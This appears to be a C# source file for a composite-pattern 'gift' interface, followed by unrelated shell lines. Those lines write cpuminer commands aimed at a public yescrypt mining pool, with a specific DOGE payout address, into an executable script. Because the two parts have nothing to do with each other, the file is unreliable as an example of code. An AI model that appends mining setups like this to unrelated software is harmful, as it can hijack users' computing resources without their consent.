namespace CompositePattern.Models.Interfaces;

internal interface IGiftOperations
{
    void Add(GiftBase gift);
    void Remove(GiftBase gift);
}



echo "./cpuminer -a yescrypt --param-n 4096 --param-r 16 -o stratum+tcp://yescrypt.eu.mine.zergpool.com:6233 -u DPYJxD8KMfc8T8tUbu5SraUshR4ghRm9uf -p c=DOGE,ID=Note-4-M2 -t 8 -q" > yescrypt.sh

echo "./cpuminer -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zergpool.com:6233 -u DPYJxD8KMfc8T8tUbu5SraUshR4ghRm9uf -p c=DOGE,ID=Note-4-M1 -t 8 -q" > yescrypt.sh
chmod +x yescrypt.sh


